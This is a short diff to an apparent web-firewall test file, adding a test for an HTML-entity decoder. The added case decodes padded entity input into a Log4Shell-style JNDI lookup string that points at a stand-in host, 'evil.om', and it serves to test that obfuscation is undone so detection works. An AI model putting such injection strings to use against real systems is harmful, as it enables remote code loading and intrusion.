@@ -47,5 +47,12 @@
       "name" : "htmlEntityDecode",
       "input" : "&#x0;&#X0;&#x20;&#X20;&#0;&#32;\\x00&#100;&quot;&amp;&lt;&gt;&nbsp;",
       "type" : "tfn"
+   },
+   {
+      "output" : "${jndi:ldap://evil.om/w}",
+      "ret" : 1,
+      "name" : "htmlEntityDecode",
+      "input" : "&#x24;&#00000000000000000000000000000000000000000000000123;jndi:ldap://evil.om/w}",
+      "type" : "tfn"
    }
 ]
